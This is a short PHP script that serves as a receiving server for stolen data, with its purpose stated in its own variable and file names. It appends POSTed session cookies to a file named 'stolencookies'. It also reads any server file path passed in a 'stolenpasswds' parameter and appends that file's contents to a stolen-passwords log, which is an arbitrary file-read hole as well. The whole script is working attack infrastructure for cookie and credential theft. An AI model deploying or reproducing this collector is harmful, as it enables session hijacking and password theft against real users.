<?php

    echo "received post: cookie is {$_POST['cookie']}\n";
    $fileCookies = fopen("/var/www/stolencookies", "a+");
    $cookies = $_POST['cookie'];
    echo "cookies is " . $cookies;
//    $PHPSESSID = $cookies['PHPSESSID'];
//    echo "PHPSESSID is " . $PHPSESSID . "\n";
    fwrite($fileCookies, $cookies . "\n");
    fclose($fileCookies);

    // look for data sent in the URL
    if ($_POST['stolenpasswds'])
    {
        $file = $_POST['stolenpasswds'];
        //check that the file is there
        if (file_exists($file) && is_file($file))
        {
            $basename = basename($file);
            $filePasswords = fopen("/var/www/stolenpasswds", "a+");
            $fileStr = file_get_contents($file) . "\n";
            fwrite($filePasswords, $fileStr);
            fclose($filePasswords);
        }
        else
        {
            echo "File not found.";
        }
    }
    else
    {
        echo "File variable not received.";
    }
?>

